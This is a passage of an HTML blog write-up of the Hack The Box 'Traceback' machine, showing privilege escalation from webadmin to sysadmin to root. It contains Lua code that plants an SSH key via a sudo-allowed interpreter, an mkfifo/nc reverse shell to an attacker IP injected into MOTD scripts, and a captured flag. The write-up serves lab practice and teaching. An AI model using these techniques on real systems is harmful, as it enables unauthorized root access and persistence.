</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat ~/.ssh/id_rsa.pub 
</span></span><span class=line><span class=cl>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ssh webadmin@10.10.10.181 -i ~/.ssh/id_rsa
</span></span><span class=line><span class=cl>The authenticity of host &#39;10.10.10.181 (10.10.10.181)&#39; can&#39;t be established.
</span></span><span class=line><span class=cl>ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
</span></span><span class=line><span class=cl>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class=line><span class=cl>Warning: Permanently added &#39;10.10.10.181&#39; (ECDSA) to the list of known hosts.
</span></span><span class=line><span class=cl>#################################
</span></span><span class=line><span class=cl>-------- OWNED BY XH4H  ---------
</span></span><span class=line><span class=cl>- I guess stuff could have been configured better ^^ -
</span></span><span class=line><span class=cl>#################################
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Welcome to Xh4H land 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Sun Mar 15 09:14:09 2020 from 10.10.15.22
</span></span><span class=line><span class=cl>webadmin@traceback:~$
</span></span></code></pre></td></tr></table></div></div><p>We can see that we can run a command <code>luvit</code> as sysadmin:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>webadmin@traceback:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries for webadmin on traceback:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User webadmin may run the following commands on traceback:
</span></span><span class=line><span class=cl>    (sysadmin) NOPASSWD: /home/webadmin/luvit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>webadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit
</span></span><span class=line><span class=cl>Welcome to the Luvit repl!
</span></span><span class=line><span class=cl>&gt; 
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--webadmin-to-sysadmin>Privilege Escalation of Machine : webadmin to sysadmin<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--webadmin-to-sysadmin>#</a></h2><p><code>luvit</code> is just a wrapper opening a lua interpreter.</p><p>Let&rsquo;s create a LUA PoC to pe.</p><p>We can use <a href=https://github.com/mzfr/gtfo>gtfo</a> to search over <a href=https://gtfobins.github.io/>GTFObins</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gtfo -b lua
</span></span></code></pre></td></tr></table></div></div><p>With <a href=https://gtfobins.github.io/gtfobins/lua/>lua</a> it&rsquo;s possible to open a
shell directly with <code>os.execute("/bin/bash")</code> or to write our SSH
key to get persistence:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-lua data-lang=lua><span class=line><span class=cl><span class=kd>local</span> <span class=n>file</span> <span class=o>=</span> <span class=n>io.open</span><span class=p>(</span><span class=s2>&#34;/home/sysadmin/.ssh/authorized_keys&#34;</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=p>:</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=p>:</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>We have just to execute the lua interpreter as sysadmin and paste our lua PoC.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>webadmin@traceback:~$ sudo -u sysadmin /home/webadmin/luvit cyfun.lua
</span></span></code></pre></td></tr></table></div></div><p>Then we can log in as sysadmin over ssh & get the user flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa
</span></span><span class=line><span class=cl>#################################
</span></span><span class=line><span class=cl>-------- OWNED BY XH4H  ---------
</span></span><span class=line><span class=cl>- I guess stuff could have been configured better ^^ -
</span></span><span class=line><span class=cl>#################################
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Welcome to Xh4H land 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Sun Mar 15 09:42:11 2020 from 10.10.14.76
</span></span><span class=line><span class=cl>$ cat user.txt
</span></span><span class=line><span class=cl>c24349701ae38c33ffbf0cceb2c46020
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation-of-machine--sysadmin-to-root>Privilege Escalation of Machine : sysadmin to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--sysadmin-to-root>#</a></h2><p>We can see that the MOTD directory is writable by sysadmin.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sysadmin@traceback:~$ ls -lh /etc/update-motd.d
</span></span><span class=line><span class=cl>total 24K
</span></span><span class=line><span class=cl>-rwxrwxr-x 1 root sysadmin  981 Mar 15 10:46 00-header
</span></span><span class=line><span class=cl>-rwxrwxr-x 1 root sysadmin  982 Mar 15 10:46 10-help-text
</span></span><span class=line><span class=cl>-rwxrwxr-x 1 root sysadmin 4.2K Mar 15 10:46 50-motd-news
</span></span><span class=line><span class=cl>-rwxrwxr-x 1 root sysadmin  604 Mar 15 10:46 80-esm
</span></span><span class=line><span class=cl>-rwxrwxr-x 1 root sysadmin  299 Mar 15 10:46 91-release-upgrade
</span></span></code></pre></td></tr></table></div></div><p>Owned by root but writable by sysadmin so we can add any command in it.
But it seems there are reset pretty often so we can do an infinite loop to append our
reverse shell to <code>/etc/update-motd.d/00-header</code> indefinitely.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>while</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=k>do</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> <span class=s1>&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.44 9999 &gt;/tmp/f&#39;</span> &gt;&gt; /etc/update-motd.d/00-header
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>Launch a new connection <code>ssh sysadmin@10.10.10.181 -i ~/.ssh/id_rsa</code> that will
trigger the reverse shell as root and gain access with a listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nc -nlp 9999
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span class=line><span class=cl># uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>